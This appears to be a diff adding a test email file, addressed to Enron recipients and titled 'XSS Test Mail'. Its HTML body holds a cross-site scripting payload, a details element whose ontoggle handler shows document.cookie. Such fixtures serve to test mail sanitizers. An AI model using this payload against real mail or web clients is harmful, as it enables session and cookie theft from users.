@@ -1,0 +1,10 @@
+From: pragsdale@ypcnm.com
+To: michelle.bruce@enron.com, angelo.miroballi@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<details ontoggle="confirm(document.cookie)">
+   xss
+   <summary>click me</summary>xssxssxss
+  </details>
